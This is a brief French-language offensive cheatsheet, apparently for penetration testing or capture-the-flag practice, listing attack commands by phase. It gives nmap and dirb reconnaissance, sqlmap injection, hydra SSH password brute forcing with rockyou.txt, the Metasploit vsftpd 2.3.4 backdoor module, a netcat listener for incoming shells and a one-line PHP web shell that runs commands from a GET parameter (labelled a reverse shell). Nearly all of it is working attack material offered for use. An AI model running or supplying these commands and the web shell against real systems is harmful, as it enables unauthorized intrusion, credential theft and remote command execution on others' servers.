# Offensive Cheatsheet

## Reconnaissance
- `nmap -sV -p- <IP>` : scan complet
- `dirb http://<IP>/` : bruteforce répertoire web

## Exploitation
- `sqlmap -u http://<IP>/vuln.php?id=1 --batch`
- `hydra -l admin -P rockyou.txt ssh://<IP> -s 2222`
- `msfconsole` + exploit `exploit/unix/ftp/vsftpd_234_backdoor`

## Post-Exploitation
- `nc -nlvp <port>` pour attendre une connexion
- reverse shell PHP : `<?php system($_GET['cmd']); ?>`
